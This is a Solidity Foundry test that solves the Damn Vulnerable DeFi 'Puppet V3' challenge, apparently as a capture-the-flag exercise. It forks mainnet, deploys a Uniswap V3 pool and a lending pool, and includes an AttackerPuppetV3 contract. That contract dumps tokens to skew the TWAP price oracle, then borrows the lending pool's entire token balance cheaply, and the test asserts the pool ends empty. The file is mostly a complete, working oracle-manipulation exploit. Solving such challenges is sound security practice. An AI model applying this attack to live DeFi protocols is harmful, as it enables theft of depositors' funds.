// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {BaseTest} from "../BaseTest.sol";
import {Utilities} from "../utils/Utilities.sol";

import "forge-std/Test.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH9} from "../../src/WETH9.sol";

import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

import {IUniswapV3Factory, IUniswapV3Pool, ISwapRouter, INonfungiblePositionManager} from "../../src/puppet-v3/Interfaces.sol";

contract PuppetV3Test is BaseTest {
    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    // uint256 constant DEPLOYER_INITIAL_ETH_BALANCE = 200e18;

    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000e18;

    uint24 constant FEE = 3000;
    uint160 constant SQRTPRICEX96 = 79228162514264337593543950336;

    IUniswapV3Pool uniswapV3Pool;
    IUniswapV3Factory uniswapV3Factory;
    ISwapRouter uniswapRouter;
    INonfungiblePositionManager uniswapPositionManager;

    DamnValuableToken token;
    WETH9 weth;

    PuppetV3Pool puppetV3Pool;
    AttackerPuppetV3 attackerPuppetV3;

    address attacker;
    address user;

    uint256 initialBlockTimestamp;

    constructor() {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 15450164);
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        labels[1] = "User";

        preSetup(2, PLAYER_INITIAL_ETH_BALANCE, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        vm.label(attacker, "Attacker");

        user = users[1];

        vm.label(user, "User");

        uniswapV3Factory = IUniswapV3Factory(
            0x1F98431c8aD98523631AE4a59f267346ea31F984
        );
        vm.label(address(uniswapV3Factory), "uniswapV3Factory");

        weth = WETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
        vm.label(address(weth), "WETH9");

        vm.deal(address(uniswapV3Factory), UNISWAP_INITIAL_WETH_LIQUIDITY);

        vm.startPrank(address(uniswapV3Factory));
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
        vm.stopPrank();

        token = new DamnValuableToken();
        vm.label(address(token), "DamnValuableToken");

        uniswapPositionManager = INonfungiblePositionManager(
            0xC36442b4a4522E871399CD717aBDD847Ab11FE88
        );
        vm.label(address(uniswapPositionManager), "uniswapPositionManager");

        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        vm.label(address(uniswapRouter), "uniswapRouter");

        (address token0, address token1) = address(weth) < address(token)
            ? (address(weth), address(token))
            : (address(token), address(weth));
        uniswapPositionManager.createAndInitializePoolIfNecessary(
            token0,
            token1,
            FEE,
            SQRTPRICEX96
        );

        (uint256 amount0Desired, uint256 amount1Desired) = address(weth) <
            address(token)
            ? (UNISWAP_INITIAL_WETH_LIQUIDITY, UNISWAP_INITIAL_TOKEN_LIQUIDITY)
            : (UNISWAP_INITIAL_TOKEN_LIQUIDITY, UNISWAP_INITIAL_WETH_LIQUIDITY);

        uniswapPositionManager.createAndInitializePoolIfNecessary(
            token0,
            token1,
            FEE,
            SQRTPRICEX96
        );

        address uniswapPoolAddress = uniswapV3Factory.getPool(
            address(weth),
            address(token),
            FEE
        );

        uniswapV3Pool = IUniswapV3Pool(uniswapPoolAddress);
        vm.label(address(uniswapV3Pool), "uniswapV3Pool");

        uniswapV3Pool.increaseObservationCardinalityNext(40);
        weth.deposit{value: 10000000000e18}();
        weth.approve(address(uniswapPositionManager), type(uint256).max);

        token.approve(address(uniswapPositionManager), type(uint256).max);

        INonfungiblePositionManager.MintParams
            memory params = INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: FEE,
                tickLower: -60,
                tickUpper: 60,
                amount0Desired: amount0Desired,
                amount1Desired: amount1Desired,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp * 2
            });

        uniswapPositionManager.mint(params);

        puppetV3Pool = new PuppetV3Pool(
            address(weth),
            address(token),
            address(uniswapV3Pool)
        );
        vm.label(address(puppetV3Pool), "puppetV3Pool");

        token.transfer(attacker, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(
            address(puppetV3Pool),
            LENDING_POOL_INITIAL_TOKEN_BALANCE
        );

        vm.warp(block.timestamp + (3 * 24 * 60 * 60)); // block.timestamp = 3 * 24 * 60 * 60
        vm.roll(block.number + 1);

        vm.prank(attacker);
        attackerPuppetV3 = new AttackerPuppetV3(
            address(uniswapRouter),
            address(puppetV3Pool),
            address(token),
            address(weth)
        );

        initialBlockTimestamp = block.timestamp;
    }

    function test_ExploitPuppetV3() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(attacker);
        token.approve(address(attackerPuppetV3), type(uint256).max);

        // STEP 1
        attackerPuppetV3.movePrice();

        // STEP 2
        // updates the block.timestamp to block.timestamp + 105
        //1.75 minutes
        vm.warp(block.timestamp + 105);
        // updates the block.number to block.number + 1
        vm.roll(block.number + 1);

        // STEP3
        attackerPuppetV3.borrowFromPoolAtCheap();
        vm.stopPrank();
    }

    function success() internal override {
        assertLt(block.timestamp - initialBlockTimestamp, 155);
        assertEq(token.balanceOf(address(puppetV3Pool)), 0);
        assertGe(token.balanceOf(attacker), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
}

pragma solidity ^0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

// interface IWETH {
//     function approve(address, uint256) external returns (bool);

//     function withdraw(uint256) external;

//     function balanceOf(address) external view returns (uint256);
// }

interface ILendingPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 amount)
        external
        view
        returns (uint256);
}

contract AttackerPuppetV3 {
    ISwapRouter immutable router;
    PuppetV3Pool immutable pool;
    IERC20 immutable token;
    WETH9 immutable weth;

    address payable immutable attacker;

    constructor(
        address _router,
        address _pool,
        address _token,
        address _weth
    ) {
        router = ISwapRouter(_router);
        pool = PuppetV3Pool(_pool);
        token = IERC20(_token);
        weth = WETH9(payable(_weth));

        attacker = payable(msg.sender);
    }

    function movePrice() external {
        require(msg.sender == attacker, "Access_Denied");
        uint256 amount = token.balanceOf(attacker);

        //transfer attacker token to this Attacker contract
        token.transferFrom(attacker, address(this), amount);

        //approves DVT amount to the router inorder to swap the amount
        token.approve(address(router), amount);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams(
                address(token),
                address(weth),
                3000,
                address(this),
                block.timestamp + 3,
                amount,
                0,
                0
            );

        //swaps all the DVT tokens for WETH in the pool
        router.exactInputSingle(params);
    }

    function borrowFromPoolAtCheap() external {
        require(msg.sender == attacker, "Access_Denied");

        uint256 poolBalance = token.balanceOf(address(pool));

        //amount of weth required to borrow all the DVT tokens in lending pool
        uint256 wethAmount = pool.calculateDepositOfWETHRequired(poolBalance);

        //approves weth to the lending pool
        weth.approve(address(pool), wethAmount);

        //calls the borrow function on lending pool with the said amount
        pool.borrow(poolBalance);

        uint256 tokenAmount = token.balanceOf(address(this));
        // if eveything goes right the attacker address will be transferred all the
        // lending pool tokens and the lending pool will be empty
        token.transfer(attacker, tokenAmount);
    }
}
